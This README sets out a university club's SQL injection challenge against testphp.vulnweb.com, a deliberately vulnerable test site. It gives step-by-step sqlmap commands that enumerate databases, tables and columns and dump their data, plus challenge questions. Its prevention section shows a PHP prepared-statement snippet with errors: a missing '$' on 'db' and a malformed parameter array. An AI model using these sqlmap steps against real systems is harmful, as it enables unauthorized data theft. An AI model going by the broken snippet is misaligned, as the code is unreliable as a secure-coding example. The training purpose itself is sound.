## SQLi-sqlmap-challenge
* Author: Kitsios Marios
* Date: 29/11/2021
* Topic: SQLi tool: sqlmap
* Challenge created specifically for the Cyber Security Club of University of Macedonia


## Install sqlmap
Instructions for installation of sqlmap here: https://github.com/sqlmapproject/sqlmap
```
$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Connect 
* Connect to http://testphp.vulnweb.com/

## Find a possible vulnerable location in the website
   * example: http://testphp.vulnweb.com/something.php?something=something
   ```
   If you cant find a potentially vulnerable location in the website
   base64 decode this to get a hint on where it is: aHR0cDovL3Rlc3RwaHAudnVsbndlYi5jb20vbGlzdHByb2R1Y3RzLnBocD9jYXQ9MQ== 
   ```
   
## Use sqlmap to enumerate the databases and to check if the GET parameter that is being passed is vulnerable to SQLi
   There are two ways to do that:
   * First way:
   ```
      sqlmap -u <url> --dbs
             -u Target URL (e.g. "http://www.site.com/vuln.php?id=1")
             --dbs Enumerate the databases
   ```
   * Second way:
   Intercept the request with BurpSuite (or whatever you prefer)
   Save the request in a .txt file (because sqlmap works best with a .txt file)
   ```
      sqlmap -u <url> -r <file_path.txt> --dbs
                      -r Specifies a file to read the get request instead of the url
   ```
   
## List all the tables of a database 
```
  sqlmap -u <url> -D <db_name> --tables
                  -D DBMS database to enumerate
                  --tables  Enumerate DBMS database tables
```

## List information about the columns of a table 
```
   sqlmap -u <url> -D <db_name> -T <table_name> --columns
                                -T Specify a table in a database
                                --columns Query the column names
```

## Retrieve column data from table
```
   sqlmap -u <url> -D <db_name> -T <table_name> -C <column_name> --dump
                                                -C Specify column name to dump data from
                                                --dump Rtrieves the data
```

## Prevent SQL Injection

  SQL injection can be generally prevented by using Prepared Statements . When we use a prepared statement, we are basically using a template for the code and analyzing the code and user input separately. It does not mix the user entered query and the code. A code vulnerability often exists, when the **input entered by the user is directly inserted into the code and they are compiled together, and hence we are able to execute malicious code.** For prepared statements, we basically send the sql query with a placeholder for the user input and then send the actual user input as a separate command. 
  
Consider the following php code segment. https://stackoverflow.com/
```
        $db = new PDO('connection details');
        $stmt = db->prepare("Select name from users where id = :id");
        $stmt->execute(array(':id', $data));
```
In this code, the user input is not combined with the prepared statement. They are compiled separately. So even if malicious code is entered as user input, the program will simply treat the malicious part of the code as a string and not a command. 

## Questions to be answered:
  1.Which DBMS is being used and what version is it
  2.What are the names of the two databases 
  3.How many tables are there in the database acuart
  4.What kind of data type is being stored in the “adsec” column of the table “artists”
  5.What is the 1st value of “aname” column of the table “artists” and the database “acuart”
